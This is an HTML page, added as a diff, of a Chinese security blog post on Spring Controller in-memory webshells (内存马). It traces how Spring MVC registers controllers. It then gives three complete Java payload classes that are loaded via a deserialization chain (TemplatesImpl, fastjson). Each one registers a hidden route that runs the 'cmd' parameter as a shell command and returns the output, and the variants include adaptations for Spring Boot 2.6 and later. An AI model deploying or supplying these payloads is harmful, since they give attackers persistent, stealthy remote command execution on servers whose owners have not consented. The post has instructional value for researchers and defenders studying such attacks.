@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="博客">
+    <meta name="description" content="最难不过坚持">
+    <meta name="author" content="lazysugar">
+    
+    <title>
+        
+            Spring Controller内存马 |
+        
+        lazysugar&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/favicon-32x32.ico">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"1azy.icu","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"style":{"primary_color":"#0066cc","logo":"/favicon-32x32.ico","favicon":"/favicon-32x32.ico","avatar":"/favicon-32x32.ico","first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"最难不过坚持.","hitokoto":true},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":false},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"version":"3.8.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container border-box">
+
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/favicon-32x32.ico">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               lazysugar&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+
+                
+
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+
+        <div class="article-content-container border-box">
+
+            
+
+            <div class="article-content-bottom border-box">
+                
+                    <div class="article-title">
+                        Spring Controller内存马
+                    </div>
+                
+
+                
+                    <div class="article-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/favicon-32x32.ico">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author">
+                                <span class="name">lazysugar</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="article-meta-info-container border-box post">
+    <div class="article-meta-info border-box">
+        
+
+
+        
+            <span class="meta-info-item article-create-date">
+                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
+                <span class="pc">2023-07-15 03:16:12</span>
+                <span class="mobile">2023-07-15 03:16</span>
+            </span>
+
+            <span class="meta-info-item article-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="pc" data-updated="Wed Oct 25 2023 18:35:59 GMT+0800">2023-10-25 18:35:59</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="article-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="article-tag meta-info-item border-box">
+                <i class="icon fas fa-tags"></i>&nbsp;
+                <ul class="article-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item article-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.6k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item article-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>8 分钟</span>
+            </span>
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="article-content keep-markdown-body">
+                    
+
+                    <h1 id="什么时候用内存马？"><a href="#什么时候用内存马？" class="headerlink" title="什么时候用内存马？"></a>什么时候用内存马？</h1><p>1、反序列化漏洞（有依赖可利用）</p>
+<p>2、目标不出网</p>
+<p>3、想要回显信息</p>
+<p>最近总结fastjson不出网的时候遇到了，所以认真复现下</p>
+<h1 id="SpringMVC是如何注册Controller的？"><a href="#SpringMVC是如何注册Controller的？" class="headerlink" title="SpringMVC是如何注册Controller的？"></a>SpringMVC是如何注册Controller的？</h1><p>Spring是通过<code>RequestMappingHandlerMapping</code>的Bean来注册Controller的。</p>
+<p>简单打个springboot的项目来追踪下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class IndexController &#123;</span><br><span class="line"></span><br><span class="line">    @ResponseBody</span><br><span class="line">    @PostMapping(&quot;/readjson&quot;)</span><br><span class="line">    public String readJson(@RequestParam(&quot;json&quot;)String json)&#123;</span><br><span class="line">        System.out.println(json);</span><br><span class="line">        Object o = JSON.parse(json, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(o);</span><br><span class="line">        return o.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>来到<code>RequestMappingHandlerMapping</code>的抽象父类<code>AbstractHandlerMethodMapping</code>实现了<code>InitializingBean</code>接口。对所有 Bean初始化时候会执行<code>afterPropertiesSet</code> -&gt; <code>getHandlerInternal</code>方法，可以看到我们的indexController</p>
+<p><img src="/images/20230629142200.png"></p>
+<p>调用<code>processCandidateBean</code>，其中会调用<code>isHandler</code>方法，判断该Bean是否是web资源类——是否被<code>@Controller</code>或<code>@RequestMapping</code>注解或他的派生注解标记</p>
+<p><img src="/images/20230629142554.png"><br><img src="/images/20230629142611.png"></p>
+<p>判断成功后就会调用<code>detectHandlerMethods</code>进行解析Method。上部分代码就是对Bean对象的所有Method进行解析，<code>selectMethods</code>中第二个参数是一个回调方法<code>getMappingForMethod</code>里面进行解析。</p>
+<p><img src="/images/20230629143338.png"></p>
+<p>通过<code>createRequestMappingInfo</code>方法把method和handlerType作为为参数，创建了<code>RequestMappingInfo</code>对象，将两个对象结合并返回。<br><img src="/images/20230629144306.png"></p>
+<p>然后来到<code>detectHandlerMethods</code>方法的下半部分，将刚刚获取到的<code>RequestMappingInfo</code>对象集合，调用<code>registerHandlerMethod</code>遍历注册。</p>
+<p><img src="/images/20230629144614.png"></p>
+<p>调用<code>mappingRegistry</code>的<code>register</code>方法来注册</p>
+<p><img src="/images/20230629145031.png"></p>
+<p>然后我们来看看<code>DispatcherServlet</code>是如何处理请求信息的，直接看到<code>doService</code> -&gt; <code>doDispatch</code></p>
+<p><img src="/images/20230629145232.png"></p>
+<p><code>doDispatch</code>会调用<code>getHandler</code>,根据<code>Mapping</code>信息调用其<code>getHandler</code>方法，里面存在着我们的<code>RequestMappingHandlerMapping</code>。<br><img src="/images/20230629145939.png"></p>
+<p>最终调用到<code>lookupHandlerMethod</code>，会根据我们的请求路径<code>lookupPath</code>,来通过<code>mappingRegistry</code>寻找对应的<code>mapping</code>，就是<code>RequestMappingInfo</code>对象。</p>
+<p><img src="/images/20230629150642.png"></p>
+<p>所以如果要实现内存马的话就需要创建一个<code>RequestMappingInfo</code>对象然后注册到IOC容器中。</p>
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><p>继承<code>AbstractTranslet</code>是因为<code>TemplatesImpl</code>链的利用逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">public class InjectToController extends AbstractTranslet &#123;</span><br><span class="line">    public InjectToController() throws Exception &#123;</span><br><span class="line">        // 1. 利用spring内部方法获取context</span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line">        // 2. 从context中获得 RequestMappingHandlerMapping 的实例</span><br><span class="line">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        // 3. 通过反射获得自定义 controller 中的 Method 对象</span><br><span class="line">        Method method2 = null;</span><br><span class="line">        method2 = InjectToController.class.getMethod(&quot;test&quot;);</span><br><span class="line">        // 4. 定义访问 controller 的 URL 地址</span><br><span class="line">        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/1azys&quot;);</span><br><span class="line">        // 5. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br><span class="line">        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br><span class="line">        // 6. 在内存中动态注册 controller</span><br><span class="line">        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span><br><span class="line">        InjectToController injectToController = new InjectToController(&quot;aaa&quot;);</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, injectToController, method2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public void test() throws IOException &#123;</span><br><span class="line">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        try &#123;</span><br><span class="line">            String arg0 = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            PrintWriter writer = response.getWriter();</span><br><span class="line">            if (arg0 != null) &#123;</span><br><span class="line">                String o = &quot;&quot;;</span><br><span class="line">                ProcessBuilder p;</span><br><span class="line">                if (System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, arg0&#125;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                o = c.hasNext() ? c.next() : o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                response.sendError(404);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public InjectToController(String test)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="适配Springboot-2-6-0-及以上版本"><a href="#适配Springboot-2-6-0-及以上版本" class="headerlink" title="适配Springboot 2.6.0 及以上版本"></a>适配Springboot 2.6.0 及以上版本</h2><h3 id="Springboot-2-6-0-修改"><a href="#Springboot-2-6-0-修改" class="headerlink" title="Springboot 2.6.0 修改"></a>Springboot 2.6.0 修改</h3><p>在 Springboot 2.6.0 环境下注入Controller内存马后会报500错误，错误提示 java.lang.IllegalArgumentException: Expected lookupPath in request attribute “org.springframework.web.util.UrlPathHelper.PATH”</p>
+<p>原因在于从 Springboot 2.6.0 版本开始，官方修改了url路径的默认匹配策略，版本发布日志部分如下：</p>
+<p><img src="/images/20230629161856.png"></p>
+<p>追踪下看看：<br>在调用<code>RequestMappingInfo#getMatchingCondition</code>的时候，判断<code>patternsCondition</code>不为空时调用<code>getMatchingCondition</code>方法</p>
+<p><img src="/images/20230629170502.png"></p>
+<p>最终调用到<code>getResolvedLookupPath</code>，里面会断言<code>lookupPath</code>为空，导致抛出异常</p>
+<p><img src="/images/20230629170627.png"></p>
+<p>所以用<code>PatternsRequestCondition</code>创建访问 controller 的 URL 地址就不能用了</p>
+<pre><code>PatternsRequestCondition url = new PatternsRequestCondition(&quot;/1azys&quot;);
+</code></pre>
+<p>如果在 Springboot 2.6.0 的环境下，通过 application.properties配置文件设置<code>spring.mvc.pathmatch.matching-strategy</code>的值为<code>ant_path_matcher</code>，即修改服务端的路径匹配策略为 <code>AntPathMatcher</code>，注入的Controller内存马后访问就没问题了。</p>
+<p>我们看看springboot是怎么创建<code>RequestMappingInfo</code>对象的，来到<code>RequestMappingHandlerMapping#createRequestMappingInfo</code></p>
+<p><img src="/images/20230629171150.png"></p>
+<p>参照这段代码来得到<code>RequestMappingInfo</code>对象</p>
+<pre><code>RequestMappingInfo info = RequestMappingInfo.paths(&quot;/lazy&quot;)
+        .options(config)
+        .build();
+</code></pre>
+<p>最后payload：</p>
+<h4 id="实现方式1"><a href="#实现方式1" class="headerlink" title="实现方式1"></a>实现方式1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">public class InjectToController2 extends AbstractTranslet &#123;</span><br><span class="line">    public InjectToController2() throws Exception &#123;</span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;);</span><br><span class="line">        configField.setAccessible(true);</span><br><span class="line">        RequestMappingInfo.BuilderConfiguration config =</span><br><span class="line">                (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">        Method method2 = InjectToController2.class.getMethod(&quot;test&quot;);</span><br><span class="line">        RequestMappingInfo info = RequestMappingInfo.paths(&quot;/2azy&quot;)</span><br><span class="line">                .options(config)</span><br><span class="line">                .build();</span><br><span class="line">        InjectToController2 injectToController2 = new InjectToController2(&quot;aaa&quot;);</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, injectToController2, method2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public void test() throws IOException &#123;</span><br><span class="line">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        try &#123;</span><br><span class="line">            String arg0 = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            PrintWriter writer = response.getWriter();</span><br><span class="line">            if (arg0 != null) &#123;</span><br><span class="line">                String o = &quot;&quot;;</span><br><span class="line">                ProcessBuilder p;</span><br><span class="line">                if (System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, arg0&#125;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                o = c.hasNext() ? c.next() : o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                response.sendError(404);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public InjectToController2(String test)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="实现方式2"><a href="#实现方式2" class="headerlink" title="实现方式2"></a>实现方式2</h4><p>既然springboot都封装好了方法，那么直接调用<code>RequestMappingHandlerMapping#getMappingForMethod()</code>去获取<code>RequestMappingInfo</code>对象</p>
+<p>但是需要注意的是springboot封装好的方法是去读取注解信息的，我们内存马定义具体的恶意操作方法时，必须加上Mapping类的注解，比如@RequestMapping(“&#x2F;1azy”)</p>
+<p><img src="/images/20230629171850.png"></p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">public class InjectToController3 extends AbstractTranslet &#123;</span><br><span class="line">    public InjectToController3() throws Exception &#123;</span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        Method method2 = InjectToController3.class.getMethod(&quot;test&quot;);</span><br><span class="line">        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br><span class="line"></span><br><span class="line">        Method getMappingForMethod = mappingHandlerMapping.getClass().getDeclaredMethod(&quot;getMappingForMethod&quot;, Method.class, Class.class);</span><br><span class="line">        getMappingForMethod.setAccessible(true);</span><br><span class="line">        RequestMappingInfo info =</span><br><span class="line">                (RequestMappingInfo) getMappingForMethod.invoke(mappingHandlerMapping, method2, InjectToController3.class);</span><br><span class="line"></span><br><span class="line">        InjectToController3 injectToController3 = new InjectToController3(&quot;aaa&quot;);</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, injectToController3, method2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/3azy&quot;)</span><br><span class="line">    public void test() throws IOException &#123;</span><br><span class="line">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        try &#123;</span><br><span class="line">            String arg0 = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            PrintWriter writer = response.getWriter();</span><br><span class="line">            if (arg0 != null) &#123;</span><br><span class="line">                String o = &quot;&quot;;</span><br><span class="line">                ProcessBuilder p;</span><br><span class="line">                if (System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                    p = new ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, arg0&#125;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    p = new ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                o = c.hasNext() ? c.next() : o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                response.sendError(404);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public InjectToController3(String test)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+                </div>
+
+                
+                        
+<div class="article-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="post-title border-box text-ellipsis">
+                Spring Controller内存马
+            </div>
+
+            <div class="post-link border-box text-ellipsis">
+                2023/07/15/Spring Controller内存马/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">lazysugar</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2023-07-15 03:16</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans">
+                        <i class="fa-brands fa-creative-commons"></i>
+                        <i class="fa-brands fa-creative-commons-by"></i>
+                        <i class="fa-brands fa-creative-commons-nc"></i>
+                        <i class="fa-brands fa-creative-commons-sa"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
